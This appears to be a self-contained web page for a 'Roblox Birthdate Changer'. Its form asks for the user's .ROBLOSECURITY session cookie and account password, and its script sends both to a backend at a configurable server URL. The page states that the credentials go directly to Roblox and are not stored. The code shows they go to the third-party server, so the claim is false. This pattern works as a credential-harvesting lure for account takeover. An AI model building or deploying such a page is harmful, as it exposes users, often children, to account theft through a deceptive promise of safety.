<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Birthdate Changer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 100%;
            padding: 40px;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            color: #333;
            margin-bottom: 10px;
            text-align: center;
        }

        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input, select {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .date-inputs {
            display: grid;
            grid-template-columns: 1fr 1fr 2fr;
            gap: 10px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .status {
            margin-top: 20px;
            padding: 16px;
            border-radius: 10px;
            font-size: 14px;
            line-height: 1.6;
            display: none;
        }

        .status.show {
            display: block;
        }

        .status.info {
            background: #e3f2fd;
            border: 1px solid #90caf9;
            color: #1565c0;
        }

        .status.success {
            background: #e8f5e9;
            border: 1px solid #81c784;
            color: #2e7d32;
        }

        .status.error {
            background: #ffebee;
            border: 1px solid #ef5350;
            color: #c62828;
        }

        .logs {
            margin-top: 20px;
            padding: 16px;
            background: #f5f5f5;
            border-radius: 10px;
            font-size: 13px;
            font-family: 'Courier New', monospace;
            max-height: 300px;
            overflow-y: auto;
            display: none;
        }

        .logs.show {
            display: block;
        }

        .log-line {
            margin-bottom: 6px;
            padding: 4px;
        }

        .note {
            background: #fff3e0;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            color: #e65100;
            margin-top: 15px;
            border: 1px solid #ffb74d;
        }

        .note strong {
            color: #bf360c;
        }

        .server-info {
            background: #e8eaf6;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            color: #3f51b5;
            margin-bottom: 20px;
            border: 1px solid #9fa8da;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÇ Roblox Birthdate Changer</h1>
        <p class="subtitle">Change your Roblox account birthdate securely</p>

        <div class="server-info">
            <strong>‚ÑπÔ∏è Server Status:</strong> <span id="serverStatus">Checking...</span>
        </div>

        <form id="birthdateForm">
            <div class="form-group">
                <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</label>
                <input 
                    type="text" 
                    id="cookie" 
                    placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
                    required
                >
            </div>

            <div class="form-group">
                <label for="password">Account Password</label>
                <input 
                    type="password" 
                    id="password" 
                    placeholder="Enter your Roblox password"
                    required
                >
            </div>

            <div class="form-group">
                <label>New Birthdate</label>
                <div class="date-inputs">
                    <select id="birthMonth" required>
                        <option value="">Month</option>
                        <option value="1">Jan</option>
                        <option value="2">Feb</option>
                        <option value="3">Mar</option>
                        <option value="4">Apr</option>
                        <option value="5">May</option>
                        <option value="6">Jun</option>
                        <option value="7">Jul</option>
                        <option value="8">Aug</option>
                        <option value="9">Sep</option>
                        <option value="10">Oct</option>
                        <option value="11">Nov</option>
                        <option value="12">Dec</option>
                    </select>
                    <input 
                        type="number" 
                        id="birthDay" 
                        placeholder="Day"
                        min="1" 
                        max="31"
                        required
                    >
                    <input 
                        type="number" 
                        id="birthYear" 
                        placeholder="Year"
                        min="1900" 
                        max="2024"
                        required
                    >
                </div>
            </div>

            <button type="submit" class="btn" id="submitBtn">
                Change Birthdate
            </button>
        </form>

        <div id="status" class="status"></div>
        <div id="logs" class="logs"></div>

        <div class="note">
            <strong>‚ö†Ô∏è Important:</strong> This tool uses a secure backend server to communicate with Roblox APIs. Your credentials are sent directly to Roblox and not stored.
        </div>
    </div>

    <script>
        const API_URL = 'http://localhost:3000'; // Change this to your server URL

        const form = document.getElementById('birthdateForm');
        const submitBtn = document.getElementById('submitBtn');
        const statusDiv = document.getElementById('status');
        const logsDiv = document.getElementById('logs');
        const serverStatus = document.getElementById('serverStatus');

        // Check server health
        async function checkServer() {
            try {
                const response = await fetch(`${API_URL}/api/health`);
                const data = await response.json();
                serverStatus.textContent = '‚úÖ Connected';
                serverStatus.style.color = '#2e7d32';
                return true;
            } catch (error) {
                serverStatus.textContent = '‚ùå Server not running';
                serverStatus.style.color = '#c62828';
                return false;
            }
        }

        // Show status message
        function showStatus(message, type = 'info') {
            statusDiv.className = `status ${type} show`;
            statusDiv.innerHTML = message;
        }

        // Show logs
        function showLogs(logs) {
            logsDiv.className = 'logs show';
            logsDiv.innerHTML = logs.map(log => 
                `<div class="log-line">${log}</div>`
            ).join('');
            
            // Scroll to bottom
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        // Handle form submission
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const cookie = document.getElementById('cookie').value.trim();
            const password = document.getElementById('password').value;
            const birthMonth = document.getElementById('birthMonth').value;
            const birthDay = document.getElementById('birthDay').value;
            const birthYear = document.getElementById('birthYear').value;

            if (!cookie || !password || !birthMonth || !birthDay || !birthYear) {
                showStatus('‚ùå Please fill in all fields!', 'error');
                return;
            }

            // Check server
            const serverOk = await checkServer();
            if (!serverOk) {
                showStatus(
                    '‚ùå <strong>Server Error</strong><br><br>' +
                    'The backend server is not running. Please start the server with:<br>' +
                    '<code>node birthdate-server.js</code>',
                    'error'
                );
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            showStatus('üîÑ Sending request to server...', 'info');
            logsDiv.className = 'logs';

            try {
                const response = await fetch(`${API_URL}/api/change-birthdate`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        cookie,
                        password,
                        birthMonth,
                        birthDay,
                        birthYear
                    })
                });

                const data = await response.json();

                if (data.success) {
                    showStatus(
                        `üéâ <strong>Success!</strong><br><br>` +
                        `Your birthdate has been changed to: ${data.newBirthdate.month}/${data.newBirthdate.day}/${data.newBirthdate.year}`,
                        'success'
                    );
                    showLogs(data.logs);
                    
                    // Clear form
                    form.reset();
                } else {
                    showStatus(
                        `‚ùå <strong>Error</strong><br><br>` +
                        `${data.error}`,
                        'error'
                    );
                    if (data.logs) {
                        showLogs(data.logs);
                    }
                }

            } catch (error) {
                console.error('Error:', error);
                showStatus(
                    `‚ùå <strong>Network Error</strong><br><br>` +
                    `Failed to connect to server. Make sure the backend is running.<br><br>` +
                    `Error: ${error.message}`,
                    'error'
                );
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Change Birthdate';
            }
        });

        // Check server on load
        checkServer();
    </script>
</body>
</html>
